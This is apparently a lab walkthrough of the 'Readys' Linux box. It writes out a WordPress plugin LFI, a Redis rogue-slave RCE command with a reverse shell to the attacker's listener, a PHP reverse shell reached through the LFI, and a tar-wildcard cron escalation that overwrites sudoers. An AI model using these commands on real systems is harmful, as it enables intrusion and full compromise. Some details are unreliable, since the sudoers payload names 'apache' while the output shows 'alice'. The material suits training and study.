#Linux #WordPress #LFI #Redis #RogueSlave #WPScan #TarWildcard #CronAbuse #PrivEsc

## Overview

Readys is a multi-stage Linux box that chains a WordPress plugin LFI into a Redis credential leak, a Redis rogue-slave RCE to get a `redis` shell, and then a creative pivot through the LFI again to get a shell as `alice` who runs Apache. The root path is a classic tar wildcard injection in a cron job. Four distinct exploitation techniques across a single chain.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp   open  http    Apache httpd 2.4.38
|_http-generator: WordPress 5.7.2
6379/tcp open  redis   Redis key-value store
```

Redis on port 6379 requires authentication:

```sh
nc -vn 192.168.183.166 6379
info
-NOAUTH Authentication required.
```

### WordPress Plugin Enumeration

WPScan reveals the `/wp-content/uploads` directory listing is enabled, and a **Site Editor** plugin is installed at version 1.1.1.

**WordPress Plugin Site Editor 1.1.1 - Local File Inclusion**
https://www.exploit-db.com/exploits/44340

PoC:

```
http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

> **Why LFI is so valuable before foothold:** LFI doesn't give code execution on its own, but it lets you read config files, credential stores, and service configurations that are otherwise inaccessible. Here it becomes the key to authenticating Redis, which is the actual path to a shell.

Confirmed working, `/etc/passwd` output showed a real user `alice` (uid=1000).

### Leaking the Redis Password via LFI

Redis stores its configuration including password at `/etc/redis/redis.conf`. Reading it via LFI:

```
http://192.168.183.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf
```

Under the SECURITY section:

```
# requirepass Ready4Redis?
```

## Foothold

### Redis Rogue Slave RCE

With the Redis password in hand, the rogue-slave technique uses a malicious Redis instance to push a malicious `.so` module to the target, which is then loaded and executed:

- Exploit script: https://github.com/Ridter/redis-rce/blob/master/redis-rce.py
- Malicious module: `exp.so` from https://github.com/n0b0dyCN/redis-rogue-server

```sh
python3 redis-rce.py -r 192.168.180.166 -p 6379 -L 192.168.45.244 -P 80 -v -f exp.so -a "Ready4Redis?"
```

The script establishes a master-slave replication relationship, pushes `exp.so` to the target, loads it as a Redis module, and triggers a reverse shell.

Shell received as `redis`:

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.166] 41190
whoami
redis
```

TTY upgrade:

```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
redis@readys:/var/lib/redis$
```

### Credential Hunting and Pivoting to alice

`wp-config.php` contains the WordPress database credentials:

```sh
cat /var/www/html/wp-config.php
define( 'DB_USER', 'karl' );
define( 'DB_PASSWORD', 'Wordpress1234' );
```

MySQL was locally accessible and connected with these credentials, but the WordPress admin hash didn't crack.

`ps aux` shows Apache running as `alice`. The web root `/var/www/html` is not writable by `redis`, but finding writable directories:

```sh
find / -type d -maxdepth 5 -writable 2>/dev/null
```

`/run/redis` is writable. A PHP reverse shell was uploaded there, then triggered via the LFI vulnerability (which includes and executes PHP files):

```sh
curl "http://192.168.183.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/run/redis/php-reverse-shell.php"
```

Shell as `alice`:

```sh
rlwrap nc -lvnp 53
connect to [192.168.45.244] from (UNKNOWN) [192.168.183.166] 33910
uid=1000(alice) gid=1000(alice) groups=1000(alice)
$ whoami
alice
```

## Privilege Escalation

### Tar Wildcard Injection via Root Cron Job

`/etc/crontab` shows a root job running every 3 minutes:

```sh
*/3 * * * * root /usr/local/bin/backup.sh
```

Contents of `backup.sh`:

```sh
#!/bin/bash
cd /var/www/html
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then
tar -cf /opt/backups/website.tar *
fi
```

> **Why tar wildcard injection works:** When `tar` is called with a bare `*`, the shell expands the wildcard to all filenames in the current directory before passing them to `tar`. Filenames beginning with `--` are interpreted as flags by tar. Creating a file named `--checkpoint=1` tells tar to print a status after processing each file; creating `--checkpoint-action=exec=sh payload.sh` tells tar to run a shell command at each checkpoint. Since `tar` runs as root via cron, the payload runs as root.

In `/var/www/html`, as `alice`:

```sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

`payload.sh` contents (transferred from Kali):

```sh
echo 'apache ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```

After the cron fires (confirmed with `pspy32s`):

```sh
User alice may run the following commands on readys:
    (root) NOPASSWD: ALL

$ sudo su
whoami
root
```

## Root

```sh
cat proof.txt
‹redacted›
```

## Takeaways

- **LFI is a config file reader, not just a log poisoner.** Reading `/etc/redis/redis.conf` via a WordPress plugin LFI broke open an entirely separate attack surface (Redis RCE).
- **Writable directories outside the web root can still serve PHP.** Placing a PHP shell in `/run/redis` and triggering it through the same LFI endpoint combined two vulnerabilities into a lateral move.
- **Tar wildcard injection is reliable when you control the working directory.** Files whose names start with `--` become tar command-line arguments. Any cron job that runs `tar *` in a user-writable directory is exploitable this way.
